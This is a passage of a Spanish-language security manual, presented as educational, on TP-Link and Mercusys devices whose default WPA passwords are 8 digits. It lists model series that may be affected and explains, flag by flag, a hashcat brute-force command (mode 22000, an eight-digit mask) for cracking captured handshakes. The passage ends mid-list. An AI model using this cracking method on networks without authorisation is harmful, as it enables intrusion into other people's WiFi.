<html><head><meta content="text/html; charset=UTF-8" http-equiv="content-type"><style type="text/css">ol.lst-kix_8nfbjxgdqd5j-8.start{counter-reset:lst-ctn-kix_8nfbjxgdqd5j-8 0}.lst-kix_u965x3awd42f-3>li:before{content:"\0025cf   "}.lst-kix_u965x3awd42f-5>li:before{content:"\0025a0   "}.lst-kix_gaj9wbdj7miw-7>li{counter-increment:lst-ctn-kix_gaj9wbdj7miw-7}ol.lst-kix_gaj9wbdj7miw-2.start{counter-reset:lst-ctn-kix_gaj9wbdj7miw-2 0}.lst-kix_u965x3awd42f-4>li:before{content:"\0025cb   "}.lst-kix_u965x3awd42f-8>li:before{content:"\0025a0   "}.lst-kix_u965x3awd42f-1>li:before{content:"\0025cb   "}ul.lst-kix_6n5ko2vfif0o-1{list-style-type:none}ul.lst-kix_6n5ko2vfif0o-0{list-style-type:none}ul.lst-kix_6n5ko2vfif0o-3{list-style-type:none}.lst-kix_u965x3awd42f-2>li:before{content:"\0025a0   "}ul.lst-kix_6n5ko2vfif0o-2{list-style-type:none}.lst-kix_ejnppnbgtp3g-0>li{counter-increment:lst-ctn-kix_ejnppnbgtp3g-0}.lst-kix_8nfbjxgdqd5j-3>li{counter-increment:lst-ctn-kix_8nfbjxgdqd5j-3}ul.lst-kix_gaj9wbdj7miw-1{list-style-type:none}.lst-kix_gaj9wbdj7miw-8>li{counter-increment:lst-ctn-kix_gaj9wbdj7miw-8}.lst-kix_u965x3awd42f-7>li:before{content:"\0025cb   "}.lst-kix_u965x3awd42f-6>li:before{content:"\0025cf   "}ol.lst-kix_ejnppnbgtp3g-6.start{counter-reset:lst-ctn-kix_ejnppnbgtp3g-6 0}ol.lst-kix_8nfbjxgdqd5j-2.start{counter-reset:lst-ctn-kix_8nfbjxgdqd5j-2 0}.lst-kix_8nfbjxgdqd5j-4>li{counter-increment:lst-ctn-kix_8nfbjxgdqd5j-4}.lst-kix_8nfbjxgdqd5j-1>li{counter-increment:lst-ctn-kix_8nfbjxgdqd5j-1}.lst-kix_gaj9wbdj7miw-6>li{counter-increment:lst-ctn-kix_gaj9wbdj7miw-6}ul.lst-kix_6n5ko2vfif0o-5{list-style-type:none}ul.lst-kix_6n5ko2vfif0o-4{list-style-type:none}ul.lst-kix_6n5ko2vfif0o-7{list-style-type:none}ol.lst-kix_8nfbjxgdqd5j-5.start{counter-reset:lst-ctn-kix_8nfbjxgdqd5j-5 0}ul.lst-kix_6n5ko2vfif0o-6{list-style-type:none}ul.lst-kix_yolcpsr3ciiz-0{list-style-type:none}ul.lst-kix_6n5ko2vfif0o-8{list-style-type:none}ul.lst-kix_yolcpsr3ciiz-4{list-style-type:none}ul.lst-kix_yolcpsr3ciiz-3{list-style-type:none}ul.lst-kix_yolcpsr3ciiz-2{list-style-type:none}ul.lst-kix_yolcpsr3ciiz-1{list-style-type:none}ul.lst-kix_yolcpsr3ciiz-8{list-style-type:none}ul.lst-kix_yolcpsr3ciiz-7{list-style-type:none}.lst-kix_ejnppnbgtp3g-1>li{counter-increment:lst-ctn-kix_ejnppnbgtp3g-1}ul.lst-kix_yolcpsr3ciiz-6{list-style-type:none}ol.lst-kix_ejnppnbgtp3g-3.start{counter-reset:lst-ctn-kix_ejnppnbgtp3g-3 0}ul.lst-kix_yolcpsr3ciiz-5{list-style-type:none}ol.lst-kix_ejnppnbgtp3g-7.start{counter-reset:lst-ctn-kix_ejnppnbgtp3g-7 0}ol.lst-kix_ejnppnbgtp3g-0.start{counter-reset:lst-ctn-kix_ejnppnbgtp3g-0 0}.lst-kix_ejnppnbgtp3g-8>li{counter-increment:lst-ctn-kix_ejnppnbgtp3g-8}.lst-kix_ejnppnbgtp3g-2>li{counter-increment:lst-ctn-kix_ejnppnbgtp3g-2}.lst-kix_gaj9wbdj7miw-5>li{counter-increment:lst-ctn-kix_gaj9wbdj7miw-5}ol.lst-kix_8nfbjxgdqd5j-6.start{counter-reset:lst-ctn-kix_8nfbjxgdqd5j-6 0}.lst-kix_8nfbjxgdqd5j-0>li{counter-increment:lst-ctn-kix_8nfbjxgdqd5j-0}.lst-kix_yolcpsr3ciiz-7>li:before{content:"\0025cb   "}ol.lst-kix_gaj9wbdj7miw-7.start{counter-reset:lst-ctn-kix_gaj9wbdj7miw-7 0}.lst-kix_yolcpsr3ciiz-6>li:before{content:"\0025cf   "}.lst-kix_yolcpsr3ciiz-5>li:before{content:"\0025a0   "}ol.lst-kix_ejnppnbgtp3g-1.start{counter-reset:lst-ctn-kix_ejnppnbgtp3g-1 0}ul.lst-kix_6gk3acpd7ts-1{list-style-type:none}ol.lst-kix_gaj9wbdj7miw-8.start{counter-reset:lst-ctn-kix_gaj9wbdj7miw-8 0}ul.lst-kix_6gk3acpd7ts-0{list-style-type:none}ol.lst-kix_8nfbjxgdqd5j-7.start{counter-reset:lst-ctn-kix_8nfbjxgdqd5j-7 0}.lst-kix_yolcpsr3ciiz-8>li:before{content:"\0025a0   "}ol.lst-kix_8nfbjxgdqd5j-0.start{counter-reset:lst-ctn-kix_8nfbjxgdqd5j-0 0}ul.lst-kix_6gk3acpd7ts-7{list-style-type:none}ul.lst-kix_6gk3acpd7ts-6{list-style-type:none}ol.lst-kix_ejnppnbgtp3g-8.start{counter-reset:lst-ctn-kix_ejnppnbgtp3g-8 0}ul.lst-kix_6gk3acpd7ts-8{list-style-type:none}ul.lst-kix_6gk3acpd7ts-3{list-style-type:none}ul.lst-kix_6gk3acpd7ts-2{list-style-type:none}ul.lst-kix_6gk3acpd7ts-5{list-style-type:none}ul.lst-kix_6gk3acpd7ts-4{list-style-type:none}.lst-kix_ejnppnbgtp3g-8>li:before{content:"" counter(lst-ctn-kix_ejnppnbgtp3g-8,lower-roman) ". "}.lst-kix_gaj9wbdj7miw-4>li:before{content:"" counter(lst-ctn-kix_gaj9wbdj7miw-4,lower-latin) ". "}.lst-kix_gaj9wbdj7miw-6>li:before{content:"" counter(lst-ctn-kix_gaj9wbdj7miw-6,decimal) ". "}ol.lst-kix_ejnppnbgtp3g-2.start{counter-reset:lst-ctn-kix_ejnppnbgtp3g-2 0}.lst-kix_8nfbjxgdqd5j-8>li{counter-increment:lst-ctn-kix_8nfbjxgdqd5j-8}.lst-kix_gaj9wbdj7miw-5>li:before{content:"" counter(lst-ctn-kix_gaj9wbdj7miw-5,lower-roman) ". "}.lst-kix_gaj9wbdj7miw-1>li:before{content:"\0025cb   "}.lst-kix_ejnppnbgtp3g-5>li:before{content:"" counter(lst-ctn-kix_ejnppnbgtp3g-5,lower-roman) ". "}.lst-kix_gaj9wbdj7miw-0>li:before{content:"" counter(lst-ctn-kix_gaj9wbdj7miw-0,decimal) ". "}.lst-kix_ejnppnbgtp3g-4>li:before{content:"" counter(lst-ctn-kix_ejnppnbgtp3g-4,lower-latin) ". "}.lst-kix_6gk3acpd7ts-0>li:before{content:"\0025cf   "}.lst-kix_gaj9wbdj7miw-8>li:before{content:"" counter(lst-ctn-kix_gaj9wbdj7miw-8,lower-roman) ". "}.lst-kix_ejnppnbgtp3g-3>li:before{content:"" counter(lst-ctn-kix_ejnppnbgtp3g-3,decimal) ". "}.lst-kix_6gk3acpd7ts-1>li:before{content:"\0025cb   "}ol.lst-kix_ejnppnbgtp3g-5.start{counter-reset:lst-ctn-kix_ejnppnbgtp3g-5 0}.lst-kix_ejnppnbgtp3g-5>li{counter-increment:lst-ctn-kix_ejnppnbgtp3g-5}.lst-kix_gaj9wbdj7miw-7>li:before{content:"" counter(lst-ctn-kix_gaj9wbdj7miw-7,lower-latin) ". "}.lst-kix_ejnppnbgtp3g-6>li{counter-increment:lst-ctn-kix_ejnppnbgtp3g-6}.lst-kix_gaj9wbdj7miw-2>li{counter-increment:lst-ctn-kix_gaj9wbdj7miw-2}.lst-kix_6n5ko2vfif0o-0>li:before{content:"\0025cf   "}.lst-kix_6n5ko2vfif0o-1>li:before{content:"\0025cb   "}ol.lst-kix_8nfbjxgdqd5j-8{list-style-type:none}ol.lst-kix_8nfbjxgdqd5j-7{list-style-type:none}ol.lst-kix_8nfbjxgdqd5j-6{list-style-type:none}ol.lst-kix_8nfbjxgdqd5j-5{list-style-type:none}ol.lst-kix_8nfbjxgdqd5j-4{list-style-type:none}ol.lst-kix_8nfbjxgdqd5j-3{list-style-type:none}ol.lst-kix_8nfbjxgdqd5j-2{list-style-type:none}.lst-kix_8nfbjxgdqd5j-7>li{counter-increment:lst-ctn-kix_8nfbjxgdqd5j-7}.lst-kix_gaj9wbdj7miw-2>li:before{content:"" counter(lst-ctn-kix_gaj9wbdj7miw-2,lower-roman) ". "}.lst-kix_ejnppnbgtp3g-6>li:before{content:"" counter(lst-ctn-kix_ejnppnbgtp3g-6,decimal) ". "}.lst-kix_ejnppnbgtp3g-7>li:before{content:"" counter(lst-ctn-kix_ejnppnbgtp3g-7,lower-latin) ". "}.lst-kix_gaj9wbdj7miw-3>li:before{content:"" counter(lst-ctn-kix_gaj9wbdj7miw-3,decimal) ". "}ol.lst-kix_8nfbjxgdqd5j-1.start{counter-reset:lst-ctn-kix_8nfbjxgdqd5j-1 0}ul.lst-kix_u965x3awd42f-5{list-style-type:none}ul.lst-kix_u965x3awd42f-6{list-style-type:none}ul.lst-kix_u965x3awd42f-7{list-style-type:none}ul.lst-kix_u965x3awd42f-8{list-style-type:none}.lst-kix_yolcpsr3ciiz-2>li:before{content:"\0025a0   "}.lst-kix_yolcpsr3ciiz-4>li:before{content:"\0025cb   "}.lst-kix_ejnppnbgtp3g-4>li{counter-increment:lst-ctn-kix_ejnppnbgtp3g-4}ul.lst-kix_u965x3awd42f-1{list-style-type:none}.lst-kix_gaj9wbdj7miw-0>li{counter-increment:lst-ctn-kix_gaj9wbdj7miw-0}.lst-kix_gaj9wbdj7miw-3>li{counter-increment:lst-ctn-kix_gaj9wbdj7miw-3}ul.lst-kix_u965x3awd42f-2{list-style-type:none}.lst-kix_ejnppnbgtp3g-7>li{counter-increment:lst-ctn-kix_ejnppnbgtp3g-7}ul.lst-kix_u965x3awd42f-3{list-style-type:none}ul.lst-kix_u965x3awd42f-4{list-style-type:none}.lst-kix_yolcpsr3ciiz-3>li:before{content:"\0025cf   "}ol.lst-kix_8nfbjxgdqd5j-1{list-style-type:none}ol.lst-kix_8nfbjxgdqd5j-0{list-style-type:none}.lst-kix_6gk3acpd7ts-7>li:before{content:"\0025cb   "}ul.lst-kix_u965x3awd42f-0{list-style-type:none}.lst-kix_yolcpsr3ciiz-0>li:before{content:"\0025cf   "}.lst-kix_6gk3acpd7ts-8>li:before{content:"\0025a0   "}.lst-kix_8nfbjxgdqd5j-6>li{counter-increment:lst-ctn-kix_8nfbjxgdqd5j-6}.lst-kix_yolcpsr3ciiz-1>li:before{content:"\0025cb   "}.lst-kix_ejnppnbgtp3g-1>li:before{content:"" counter(lst-ctn-kix_ejnppnbgtp3g-1,lower-latin) ". "}.lst-kix_6gk3acpd7ts-2>li:before{content:"\0025a0   "}.lst-kix_6gk3acpd7ts-3>li:before{content:"\0025cf   "}ol.lst-kix_gaj9wbdj7miw-6.start{counter-reset:lst-ctn-kix_gaj9wbdj7miw-6 0}.lst-kix_ejnppnbgtp3g-0>li:before{content:"" counter(lst-ctn-kix_ejnppnbgtp3g-0,decimal) ". "}.lst-kix_ejnppnbgtp3g-2>li:before{content:"" counter(lst-ctn-kix_ejnppnbgtp3g-2,lower-roman) ". "}ol.lst-kix_gaj9wbdj7miw-0.start{counter-reset:lst-ctn-kix_gaj9wbdj7miw-0 0}.lst-kix_6gk3acpd7ts-6>li:before{content:"\0025cf   "}.lst-kix_8nfbjxgdqd5j-6>li:before{content:"" counter(lst-ctn-kix_8nfbjxgdqd5j-6,decimal) ". "}.lst-kix_8nfbjxgdqd5j-8>li:before{content:"" counter(lst-ctn-kix_8nfbjxgdqd5j-8,lower-roman) ". "}.lst-kix_6gk3acpd7ts-4>li:before{content:"\0025cb   "}.lst-kix_6gk3acpd7ts-5>li:before{content:"\0025a0   "}ol.lst-kix_gaj9wbdj7miw-3.start{counter-reset:lst-ctn-kix_gaj9wbdj7miw-3 0}.lst-kix_8nfbjxgdqd5j-7>li:before{content:"" counter(lst-ctn-kix_8nfbjxgdqd5j-7,lower-latin) ". "}ol.lst-kix_ejnppnbgtp3g-3{list-style-type:none}ol.lst-kix_ejnppnbgtp3g-4{list-style-type:none}ol.lst-kix_ejnppnbgtp3g-1{list-style-type:none}ol.lst-kix_ejnppnbgtp3g-2{list-style-type:none}.lst-kix_8nfbjxgdqd5j-2>li:before{content:"" counter(lst-ctn-kix_8nfbjxgdqd5j-2,lower-roman) ". "}.lst-kix_8nfbjxgdqd5j-4>li:before{content:"" counter(lst-ctn-kix_8nfbjxgdqd5j-4,lower-latin) ". "}.lst-kix_8nfbjxgdqd5j-5>li{counter-increment:lst-ctn-kix_8nfbjxgdqd5j-5}ol.lst-kix_ejnppnbgtp3g-0{list-style-type:none}.lst-kix_gaj9wbdj7miw-4>li{counter-increment:lst-ctn-kix_gaj9wbdj7miw-4}.lst-kix_8nfbjxgdqd5j-1>li:before{content:"" counter(lst-ctn-kix_8nfbjxgdqd5j-1,lower-latin) ". "}.lst-kix_8nfbjxgdqd5j-5>li:before{content:"" counter(lst-ctn-kix_8nfbjxgdqd5j-5,lower-roman) ". "}ol.lst-kix_ejnppnbgtp3g-7{list-style-type:none}ol.lst-kix_8nfbjxgdqd5j-3.start{counter-reset:lst-ctn-kix_8nfbjxgdqd5j-3 0}ol.lst-kix_ejnppnbgtp3g-8{list-style-type:none}ol.lst-kix_ejnppnbgtp3g-5{list-style-type:none}ol.lst-kix_ejnppnbgtp3g-6{list-style-type:none}.lst-kix_8nfbjxgdqd5j-3>li:before{content:"" counter(lst-ctn-kix_8nfbjxgdqd5j-3,decimal) ". "}.lst-kix_ejnppnbgtp3g-3>li{counter-increment:lst-ctn-kix_ejnppnbgtp3g-3}ol.lst-kix_ejnppnbgtp3g-4.start{counter-reset:lst-ctn-kix_ejnppnbgtp3g-4 0}ol.lst-kix_gaj9wbdj7miw-4.start{counter-reset:lst-ctn-kix_gaj9wbdj7miw-4 0}.lst-kix_8nfbjxgdqd5j-0>li:before{content:"" counter(lst-ctn-kix_8nfbjxgdqd5j-0,decimal) ". "}.lst-kix_6n5ko2vfif0o-8>li:before{content:"\0025a0   "}.lst-kix_6n5ko2vfif0o-7>li:before{content:"\0025cb   "}ol.lst-kix_8nfbjxgdqd5j-4.start{counter-reset:lst-ctn-kix_8nfbjxgdqd5j-4 0}ol.lst-kix_gaj9wbdj7miw-5.start{counter-reset:lst-ctn-kix_gaj9wbdj7miw-5 0}.lst-kix_6n5ko2vfif0o-2>li:before{content:"\0025a0   "}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ol.lst-kix_gaj9wbdj7miw-0{list-style-type:none}.lst-kix_6n5ko2vfif0o-3>li:before{content:"\0025cf   "}.lst-kix_u965x3awd42f-0>li:before{content:"\0025cf   "}ol.lst-kix_gaj9wbdj7miw-7{list-style-type:none}ol.lst-kix_gaj9wbdj7miw-8{list-style-type:none}.lst-kix_6n5ko2vfif0o-4>li:before{content:"\0025cb   "}.lst-kix_6n5ko2vfif0o-5>li:before{content:"\0025a0   "}ol.lst-kix_gaj9wbdj7miw-5{list-style-type:none}ol.lst-kix_gaj9wbdj7miw-6{list-style-type:none}ol.lst-kix_gaj9wbdj7miw-3{list-style-type:none}ol.lst-kix_gaj9wbdj7miw-4{list-style-type:none}.lst-kix_6n5ko2vfif0o-6>li:before{content:"\0025cf   "}ol.lst-kix_gaj9wbdj7miw-2{list-style-type:none}.lst-kix_8nfbjxgdqd5j-2>li{counter-increment:lst-ctn-kix_8nfbjxgdqd5j-2}ol{margin:0;padding:0}table td,table th{padding:0}.c29{background-color:#edeef1;margin-left:36pt;padding-top:11pt;padding-bottom:20pt;line-height:1.4285714285714286;orphans:2;widows:2;text-align:left}.c0{background-color:#ffffff;color:#1a1c1e;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:"Arial";font-style:normal}.c4{background-color:#ffffff;margin-left:36pt;padding-top:11pt;padding-bottom:11pt;line-height:1.4285714285714286;orphans:2;widows:2;text-align:left}.c18{background-color:#ffffff;padding-top:0pt;padding-bottom:0pt;line-height:1.2727272727272727;orphans:2;widows:2;text-align:left}.c16{background-color:#ffffff;padding-top:11pt;padding-bottom:14pt;line-height:1.4285714285714286;orphans:2;widows:2;text-align:left}.c22{margin-left:72pt;padding-top:11pt;padding-bottom:11pt;line-height:1.4285714285714286;orphans:2;widows:2;text-align:left}.c19{background-color:#ffffff;padding-top:11pt;padding-bottom:0pt;line-height:1.4285714285714286;orphans:2;widows:2;text-align:left}.c25{background-color:#edeef1;padding-top:0pt;padding-bottom:9pt;line-height:1.5714285714285714;orphans:2;widows:2;text-align:left}.c2{padding-top:0pt;padding-bottom:0pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c20{font-weight:700;text-decoration:none;vertical-align:baseline;font-family:"Arial";font-style:normal}.c7{font-weight:400;text-decoration:none;vertical-align:baseline;font-family:"Arial";font-style:normal}.c13{font-size:10pt;font-family:"Courier New";color:#1a1c1e;font-weight:400}.c1{background-color:#ffffff;color:#1a1c1e;font-size:10pt}.c32{background-color:#ffffff;max-width:451.4pt;padding:72pt 72pt 72pt 72pt}.c10{background-color:#ffffff;color:#e36209;font-size:10pt}.c6{background-color:#ffffff;color:#005cc5;font-size:10pt}.c31{text-decoration:none;vertical-align:baseline;font-style:normal}.c15{background-color:#ffffff;color:#24292e;font-size:10pt}.c3{background-color:#ffffff;color:#d73a49;font-size:10pt}.c24{background-color:#f9f9fc;color:#1a1c1e;font-size:7.5pt}.c9{background-color:#ffffff;color:#6a737d;font-size:10pt}.c5{background-color:#ffffff;color:#032f62;font-size:10pt}.c12{background-color:#ffffff;color:#6f42c1;font-size:10pt}.c27{color:#000000;font-size:11pt}.c33{color:#1a1c1e;font-size:7.5pt}.c28{color:#1a1c1e;font-size:10pt}.c23{padding:0;margin:0}.c17{color:#1a1c1e;font-size:16.5pt}.c30{color:#005cc5;font-size:10pt}.c11{color:#1a1c1e;font-size:10.5pt}.c34{color:#22863a;font-size:10pt}.c14{padding-left:0pt}.c21{font-weight:700}.c26{font-style:italic}.c8{height:11pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c32 doc-content"><h1 class="c18" id="h.cro43pywlo1m"><span class="c7 c17">Manual de Configuraci&oacute;n y Prueba de Seguridad B&aacute;sica para Dispositivos WiFi TP-Link y Mercusys con Passwords Num&eacute;ricas por Defecto</span></h1><p class="c16"><span class="c7 c11">Este manual aborda la configuraci&oacute;n de dispositivos WiFi de TP-Link y Mercusys que hist&oacute;ricamente han utilizado patrones de contrase&ntilde;a WPA por defecto de 8 d&iacute;gitos num&eacute;ricos, explica c&oacute;mo funciona un script de fuerza bruta para este tipo de passwords y proporciona un script de MicroPython para crear un entorno de prueba controlable.</span></p><p class="c16"><span class="c11 c21">Descargo de Responsabilidad:</span><span class="c7 c11">&nbsp;Este manual tiene fines educativos y de concienciaci&oacute;n sobre seguridad. La prueba de seguridad en redes o dispositivos sin autorizaci&oacute;n es ilegal y poco &eacute;tica. Utiliza las herramientas y scripts aqu&iacute; descritos &uacute;nicamente en tus propias redes y dispositivos, o en aquellos para los que tengas permiso expl&iacute;cito. La informaci&oacute;n sobre passwords por defecto es hist&oacute;rica y puede no aplicar a dispositivos o versiones de firmware recientes. Siempre verifica la password en la etiqueta del dispositivo.</span></p><h2 class="c18" id="h.kxbezqv6nll5"><span class="c7 c17">Parte 1: Dispositivos TP-Link y Mercusys con Passwords WPA Num&eacute;ricas por Defecto</span></h2><p class="c16"><span class="c7 c11">Hist&oacute;ricamente, algunos modelos de routers y, en particular, de adaptadores Powerline (PLC) con funcionalidad WiFi de TP-Link y su marca hermana Mercusys han utilizado un patr&oacute;n de password WPA/WPA2 por defecto basado &uacute;nicamente en 8 d&iacute;gitos num&eacute;ricos (0-9). Esta pr&aacute;ctica ha disminuido en modelos m&aacute;s recientes, que tienden a usar passwords m&aacute;s largas y aleatorias impresas en la etiqueta.</span></p><p class="c16"><span class="c20 c11">Factores a Considerar:</span></p><ul class="c23 lst-kix_6gk3acpd7ts-0 start"><li class="c4 c14 li-bullet-0"><span class="c11 c21">Modelos Antiguos:</span><span class="c7 c11">&nbsp;Este patr&oacute;n era m&aacute;s com&uacute;n en dispositivos fabricados hace varios a&ntilde;os.</span></li><li class="c4 c14 li-bullet-0"><span class="c11 c21">Powerline (PLC) con WiFi:</span><span class="c7 c11">&nbsp;Es m&aacute;s probable encontrar este patr&oacute;n en los adaptadores PLC que extienden la red WiFi.</span></li><li class="c4 c14 li-bullet-0"><span class="c11 c21">Routers de Gama Baja/Antiguos:</span><span class="c7 c11">&nbsp;Algunos modelos b&aacute;sicos o antiguos de routers podr&iacute;an haber utilizado este patr&oacute;n.</span></li><li class="c4 c14 li-bullet-0"><span class="c11 c21">Firmware:</span><span class="c7 c11">&nbsp;Una actualizaci&oacute;n de firmware podr&iacute;a cambiar el patr&oacute;n de password por defecto o forzar una password diferente.</span></li><li class="c4 c14 li-bullet-0"><span class="c11 c21">Regi&oacute;n:</span><span class="c7 c11">&nbsp;Las configuraciones por defecto pueden variar seg&uacute;n la regi&oacute;n de venta.</span></li></ul><p class="c16"><span class="c20 c11">Recopilaci&oacute;n (Basada en patrones hist&oacute;ricos y reportes, no una lista exhaustiva o garantizada para todos los firmwares):</span></p><p class="c16"><span class="c11">Es dif&iacute;cil proporcionar una lista </span><span class="c11 c21">exacta y completa</span><span class="c11">&nbsp;de modelos actuales que </span><span class="c11 c26">garanticen</span><span class="c11">&nbsp;tener una password por defecto de 8 d&iacute;gitos num&eacute;ricos, ya que los fabricantes cambian estas pol&iacute;ticas. Sin embargo, bas&aacute;ndose en patrones conocidos, algunos dispositivos que </span><span class="c11 c26">podr&iacute;an</span><span class="c7 c11">&nbsp;haber utilizado este esquema incluyen ciertas revisiones de:</span></p><ul class="c23 lst-kix_6n5ko2vfif0o-0 start"><li class="c4 c14 li-bullet-0"><span class="c11 c21">Adaptadores Powerline WiFi TP-Link:</span><span class="c7 c11">&nbsp;Series TL-WPAXXXX (ej. TL-WPA4220, TL-WPA8630) en versiones de hardware y firmware m&aacute;s antiguas. La password a menudo se derivaba del PIN WPS o era una secuencia simple.</span></li><li class="c4 c14 li-bullet-0"><span class="c11 c21">Routers TP-Link:</span><span class="c7 c11">&nbsp;Algunos modelos b&aacute;sicos de la serie TL-WRXXXX o modelos antiguos de la serie Archer en firmware antiguos.</span></li><li class="c4 c14 li-bullet-0"><span class="c11 c21">Adaptadores Powerline WiFi Mercusys:</span><span class="c7 c11">&nbsp;Modelos de la serie MPXXXX (ej. MP500 Kit con WiFi) podr&iacute;an haber seguido patrones similares a TP-Link en sus inicios.</span></li><li class="c4 c14 li-bullet-0"><span class="c11 c21">Routers Mercusys:</span><span class="c7 c11">&nbsp;Modelos MWXXXX (ej. MW300, MW305R) en revisiones antiguas.</span></li></ul><p class="c16"><span class="c11 c21">Verificaci&oacute;n Crucial:</span><span class="c11">&nbsp;La &uacute;nica forma fiable de saber la password por defecto de un dispositivo espec&iacute;fico es </span><span class="c11 c21">mirar la etiqueta f&iacute;sica</span><span class="c7 c11">&nbsp;en el dispositivo o su caja. Las passwords por defecto (sean de 8 d&iacute;gitos num&eacute;ricos, alfanum&eacute;ricas, etc.) siempre est&aacute;n impresas all&iacute;.</span></p><p class="c16"><span class="c7 c11">La vulnerabilidad no reside en que la password sea p&uacute;blica (est&aacute; en la etiqueta), sino en que un atacante que capture el handshake de una red con una password de 8 d&iacute;gitos num&eacute;ricos por defecto, puede intentar adivinarla por fuerza bruta en un tiempo relativamente corto (minutos, dependiendo del hardware) debido al espacio de claves peque&ntilde;o (10^8 = 100,000,000 combinaciones).</span></p><h2 class="c18" id="h.ych1wneg5idl"><span class="c7 c17">Parte 2: Script Bash para Fuerza Bruta de Passwords WPA de 8 D&iacute;gitos Num&eacute;ricos</span></h2><p class="c16"><span class="c11">Este script de Bash utiliza las herramientas </span><span class="c13">hcxpcapngtool</span><span class="c11">&nbsp;y </span><span class="c13">hashcat</span><span class="c11">&nbsp;para intentar crackear passwords WPA/WPA2 que consisten &uacute;nicamente en 8 d&iacute;gitos num&eacute;ricos. Se basa en un archivo de captura de handshake (normalmente </span><span class="c13">.cap</span><span class="c11">&nbsp;o </span><span class="c13">.pcapng</span><span class="c7 c11">) obtenido previamente (por ejemplo, usando Aircrack-ng o herramientas similares).</span></p><p class="c16"><span class="c20 c11">Prerrequisitos:</span></p><ul class="c23 lst-kix_yolcpsr3ciiz-0 start"><li class="c4 c14 li-bullet-0"><span class="c11">Tener instalados </span><span class="c13">hcxpcapngtool</span><span class="c11">&nbsp;y </span><span class="c13">hashcat</span><span class="c7 c11">&nbsp;en tu sistema (Linux, macOS, Windows con WSL).</span></li><li class="c4 c14 li-bullet-0"><span class="c11">Tener un archivo de captura (</span><span class="c13">.cap</span><span class="c11">&nbsp;o </span><span class="c13">.pcapng</span><span class="c7 c11">) que contenga un handshake WPA v&aacute;lido de la red objetivo.</span></li></ul><p class="c16"><span class="c20 c11">Explicaci&oacute;n del Script:</span></p><p class="c16"><span class="c7 c11">El script realiza los siguientes pasos:</span></p><ol class="c23 lst-kix_gaj9wbdj7miw-0 start" start="1"><li class="c4 c14 li-bullet-0"><span class="c11 c21">Configuraci&oacute;n Inicial:</span><span class="c7 c11">&nbsp;Define el nombre del archivo de log donde se guardar&aacute; toda la salida y una opci&oacute;n para limpiar archivos temporales al finalizar.</span></li><li class="c4 c14 li-bullet-0"><span class="c11 c21">Verificaci&oacute;n de Argumentos:</span><span class="c7 c11">&nbsp;Comprueba que se le ha pasado un archivo como argumento y que dicho archivo existe.</span></li><li class="c4 c14 li-bullet-0"><span class="c11 c21">Conversi&oacute;n del Archivo de Captura:</span><span class="c11">&nbsp;Utiliza </span><span class="c13">hcxpcapngtool</span><span class="c11">&nbsp;(una herramienta auxiliar para Hashcat) para convertir el archivo de captura (</span><span class="c13">.cap</span><span class="c11">&nbsp;o </span><span class="c13">.pcapng</span><span class="c11">) a un formato optimizado para Hashcat, espec&iacute;ficamente el modo </span><span class="c13">22000</span><span class="c11">&nbsp;(WPA-EAPOL). El archivo de salida tendr&aacute; la extensi&oacute;n </span><span class="c13">.hc22000</span><span class="c7 c11">.</span></li><li class="c4 c14 li-bullet-0"><span class="c11 c21">Ataque de Fuerza Bruta con Hashcat:</span><span class="c7 c11">&nbsp;Lanza Hashcat para intentar crackear la password.</span></li></ol><ul class="c23 lst-kix_gaj9wbdj7miw-1 start"><li class="c14 c22 li-bullet-0"><span class="c13">-m 22000</span><span class="c7 c11">: Especifica el modo de ataque para handshakes WPA-EAPOL.</span></li><li class="c22 c14 li-bullet-0"><span class="c13">-a 3</span><span class="c7 c11">: Especifica el tipo de ataque &quot;Brute-force&quot; (fuerza bruta).</span></li><li class="c22 c14 li-bullet-0"><span class="c13">&quot;$HC22000FILE&quot;</span><span class="c7 c11">: Indica el archivo que contiene el handshake a crackear.</span></li><li class="c22 c14 li-bullet-0"><span class="c13">?d?d?d?d?d?d?d?d</span><span class="c11">: Define la m&aacute;scara de ataque. </span><span class="c13">?d</span><span class="c7 c11">&nbsp;es un placeholder para un d&iacute;gito num&eacute;rico (0-9). Repetido 8 veces, indica que se probar&aacute;n todas las combinaciones posibles de 8 d&iacute;gitos.</span></li><li class="c22 c14 li-bullet-0"><span class="c13">--status</span><span class="c7 c11">: Muestra estad&iacute;sticas del progreso durante el ataque.</span></li><li class="c22 c14 li-bullet-0"><span class="c13">--status-timer=10</span><span class="c7 c11">: Actualiza las estad&iacute;sticas cada 10 segundos.</span></li><li class="c22 c14 li-bullet-0"><span class="c13">--force</span><span class="c7 c11">: Desactiva algunas comprobaciones de Hashcat (a veces necesario si se ejecuta en entornos virtuales o con configuraciones de hardware no est&aacute;ndar).</span></li><li class="c22 c14 li-bullet-0"><span class="c13">&gt;&gt; &quot;$LOGFILE&quot; 2&gt;&amp;1</span><span class="c11">: Redirige tanto la salida est&aacute;ndar como los errores al archivo de log, mientras que </span><span class="c13">tee -a</span><span class="c11">&nbsp;en la funci&oacute;n </span><span class="c13">log</span><span class="c7 c11">&nbsp;tambi&eacute;n los muestra en pantalla.</span></li></ul><ol class="c23 